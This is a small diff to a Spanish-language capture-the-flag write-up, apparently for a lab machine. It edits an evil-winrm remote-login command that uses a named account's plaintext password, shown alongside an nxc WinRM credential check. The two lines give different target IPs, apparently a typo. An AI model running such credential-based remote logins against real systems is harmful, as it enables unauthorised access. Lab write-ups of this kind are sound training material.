@@ -269,7 +269,8 @@ nxc winrm 10.129.232.128 -u 'ryan' -p 'WqSZAF6CysDQbGb3'
 
 Vemos que pertenece asi que nos conectamos
 ```shell
-evil-winrm -i 10.128.232.128 -u 'ryan' -p 'WqSZAF6CysDQbGb3'
+evil-winrm -i 10.128.232.128 -u ryan -p WqSZAF6CysDQbGb3
 ```
+
 
 
